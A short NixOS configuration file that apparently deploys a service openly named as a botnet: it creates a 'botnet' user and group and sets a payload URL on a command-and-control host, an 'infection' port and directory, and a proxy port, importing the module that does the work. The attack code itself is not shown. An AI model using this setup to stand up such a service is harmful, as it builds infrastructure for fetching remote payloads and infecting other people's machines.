{ config, pkgs, ... }:

let

  cfg = {
    user = "botnet";
    group = "botnet";
    payloadURL = "http://my-command-and-control.com/payload.js";
    proxyPort = 3128;
    infectionPort = 13337;
    infectionDir = "/var/botnet/infection";
    stateDir = "/run/botnet";
    logDir = "/var/log/botnet";
    adminAddr = "foo";
  };
  
in {

  imports = [
    (import ./. cfg)
  ];

  users.extraUsers.botnet = {
    group = "botnet";
    uid = 1337;
  };

  users.extraGroups.botnet = {
    gid = 1337;
  };

}
